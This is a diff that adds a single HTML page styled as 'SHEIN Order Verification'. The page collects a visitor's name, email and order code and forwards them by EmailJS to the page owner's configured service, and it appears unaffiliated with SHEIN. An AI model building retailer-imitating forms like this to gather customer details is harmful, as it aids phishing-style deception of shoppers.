@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SHEIN Order Verification</title>
+  <!-- EmailJS SDK -->
+  <script type="text/javascript" src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }
+    form { max-width: 400px; margin: auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    input, button { width: 100%; padding: 10px; margin: 10px 0; border-radius: 4px; border: 1px solid #ccc; }
+    button { background: #ff3366; color: #fff; border: none; cursor: pointer; }
+    button:hover { background: #ff1a53; }
+  </style>
+</head>
+<body>
+
+<h2 style="text-align:center;">SHEIN Order Verification</h2>
+
+<form id="orderForm">
+  <input type="text" name="userName" placeholder="Your Name" required />
+  <input type="email" name="userEmail" placeholder="Your Email" required />
+  <input type="text" name="orderCode" placeholder="Order Code" required />
+  <button type="submit">Verify Order</button>
+</form>
+
+<script>
+  // Initialize EmailJS with your Public Key
+  emailjs.init('mq8miCQouXMcFIWh8'); // Your Public Key
+
+  // Handle form submission
+  document.getElementById('orderForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const templateParams = {
+          userEmail: this.userEmail.value, // matches {{userEmail}} in your template
+          orderCode: this.orderCode.value, // matches {{orderCode}} in template
+          userName: this.userName.value    // optional if used in template
+      };
+
+      emailjs.send(
+          'service_yz0fvxo',    // Your Service ID
+          'template_f97yvf3',   // Your Template ID
+          templateParams
+      )
+      .then(function(response) {
+          alert('Order verification email sent successfully!');
+      }, function(error) {
+          alert('Failed to send email. Please try again.');
+          console.log('ERROR:', error);
+      });
+
+      this.reset(); // Reset the form
+  });
+</script>
+
+</body>
+</html>
